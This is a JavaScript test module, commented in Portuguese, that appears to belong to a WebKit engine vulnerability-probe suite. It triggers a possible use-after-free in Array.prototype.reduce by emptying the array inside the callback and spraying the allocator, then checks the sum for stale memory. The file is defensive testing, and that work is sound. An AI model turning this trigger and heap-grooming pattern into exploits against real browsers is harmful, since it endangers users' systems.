export default {
    id:       'NATIVE_CALLBACK_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Race condition síncrona no Array.prototype.reduce(). A função de callback ' +
        'destrói o array subjacente a meio da iteração. Testa se o motor WebKit C++ ' +
        'continua a ler do Butterfly libertado ou se aborta o loop em segurança.',

    setup: function() {
        this.results = {};
        this.vulnArray = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66];
        const self = this;

        // O motor C++ vai chamar isto para cada número
        this.callback = function(acumulador, valor, index) {
            // O GATILHO: No índice 2, destruímos o array e alocamos lixo no seu lugar
            if (index === 2) {
                self.vulnArray.length = 0; 
                
                let trash = [];
                // Pressiona o alocador (bmalloc)
                for(let i = 0; i < 500; i++) trash.push(13.37);
                self.trash = trash;
            }
            return acumulador + valor;
        };
    },

    trigger: function() {
        try {
            // Se o C++ for cego, ele vai somar o nosso lixo (13.37) ou endereços de RAM aos números
            this.results.leakedSum = this.vulnArray.reduce(this.callback, 0);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O motor atirou erro ou engoliu a corrupção?
        s => s.results.error || 'Iteração C++ Concluída',
        
        // Probe 1: O Extrator Matemático de OOB (Out-of-Bounds)
        s => {
            let sum = s.results.leakedSum;
            if (typeof sum === 'number' && !isNaN(sum)) {
                // A soma esperada (se ele parar a meio) é: 0 + 1.11 + 2.22 + 3.33 = 6.66
                // Se a soma for absurdamente maior (ex: > 100), o 'reduce' continuou a ler
                // a memória apagada (lixo da RAM) e incluiu-a na matemática!
                if (sum > 100) {
                    return sum; // Dispara STALE DATA no HUD!
                }
            }
            return 0; // Protegido (o C++ meteu zeros ou undefineds)
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.callback = null;
        this.trash = null;
        this.results = {};
    }
};
